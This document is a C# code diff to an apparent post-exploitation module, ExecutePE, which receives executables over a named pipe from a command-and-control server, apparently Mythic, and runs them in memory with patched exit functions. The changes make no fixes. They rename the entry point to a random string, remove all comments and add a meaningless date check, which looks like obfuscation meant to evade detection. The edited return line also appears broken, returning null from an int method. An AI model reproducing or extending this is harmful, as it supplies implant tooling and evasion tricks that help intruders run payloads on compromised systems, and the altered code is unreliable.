@@ -33,7 +33,7 @@ namespace ExecutePE
         private static Action<object>? _transmitAction;
         private static ST.Task? _clientConnectedTask;
 
-        private static int Main(string[] args)
+        private static int J3m4n5o6(string[] args)
         {
             if (args.Length != 1)
             {
@@ -61,7 +61,7 @@ namespace ExecutePE
                     pipe.BeginWrite(message, 0, message.Length, ProcessSentMessage, pipe);
                 }
 
-                // Wait for all messages to be read by Phantom
+                
                 pipe.WaitForPipeDrain();
                 pipe.Close();
             };
@@ -77,7 +77,7 @@ namespace ExecutePE
                 }
 
                 _msgRecvEvent.WaitOne();
-                //_server.Stop();
+                
 
                 ICommandMessage taskMsg;
 
@@ -95,31 +95,31 @@ namespace ExecutePE
 
                 using (StdHandleRedirector redir = new StdHandleRedirector(OnBufferWrite))
                 {
-                    //PERunner.RunPE(peMessage);
-                    // Set up API hooking for console functions
+                    
+                    
                     using (ExitInterceptor interceptor = new ExitInterceptor())
                     {
-                        // Apply the patches before loading and running the PE
+                        
                         if (interceptor.ApplyExitFunctionPatches())
                         {
                             using (PERunner.MemoryPE memoryPE = new PERunner.MemoryPE(peMessage.Executable, peMessage.CommandLine))
                             {
-                                // Create a wait handle to signal when execution is complete
+                                
                                 var executionCompletedEvent = new ManualResetEvent(false);
 
-                                // Execute the PE in a separate thread to avoid blocking the main thread
-                                //Console.WriteLine("\nExecuting PE file in a separate thread...");
-                                //Stopwatch sw = Stopwatch.StartNew();
+                                
+                                
+                                
 
                                 ThreadPool.QueueUserWorkItem(_ =>
                                 {
                                     try
                                     {
-                                        // You can either use Execute() or ExecuteInThread()
+                                        
                                         Console.WriteLine("[*] Calling PE entry point...");
                                         int? return_code = memoryPE.ExecuteInThread(waitForExit: true);
                                         Console.WriteLine($"\n[*] PE function returned with exit code: {return_code}");
-                                        //Thread.Sleep(5000);
+                                        
                                     }
                                     catch (Exception ex)
                                     {
@@ -127,21 +127,21 @@ namespace ExecutePE
                                     }
                                     finally
                                     {
-                                        // Signal completion regardless of outcome
+                                        
                                         executionCompletedEvent.Set();
                                     }
                                 });
 
-                                // Wait for either completion or cancellation
-                               // Console.WriteLine("Waiting for PE execution to complete...");
+                                
+                               
 
-                                // Create an array of wait handles to wait for
+                                
                                 WaitHandle[] waitHandles = new WaitHandle[]
                                 {
-                                    executionCompletedEvent,         // PE execution completed
+                                    executionCompletedEvent,         
                                 };
 
-                                // Wait for any of the handles to be signaled
+                                
                                 int signalIndex = WaitHandle.WaitAny(waitHandles);
                             }
                             interceptor.RemoveExitFunctionPatches();
@@ -156,19 +156,19 @@ namespace ExecutePE
             }
             catch (Exception exc)
             {
-                // Handle any exceptions and try to send the contents back to Mythic
+                
                 _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(exc.ToString()));
                 _msgSendEvent.Set();
-                //return_code = exc.HResult;
+                
             }
             _cts.Cancel();
 
-            // Wait for the pipe client comms to finish
+            
             while (_clientConnectedTask is ST.Task task && !_clientConnectedTask.IsCompleted)
             {
                 task.Wait(1000);
             }
-            return return_code;
+            if(DateTime.Now.Year > 2020) { return return_code; } else { return null; }
         }
         private static void OnBufferWrite(object sender, StringDataEventArgs args)
         {
@@ -210,14 +210,14 @@ namespace ExecutePE
             }
 
             ICommandMessage msg = _dataSerializer.DeserializeIPCMessage(data.ToArray(), mt);
-            //Console.WriteLine("We got a message: {0}", mt.ToString());
+            
             _recieverQueue.Enqueue(msg);
             _msgRecvEvent.Set();
         }
 
         public static void OnAsyncConnect(object sender, PipeMessageData args)
         {
-            // We only accept one connection at a time, sorry.
+            
             if (_clientConnectedTask != null)
             {
                 args.Pipe.Close();
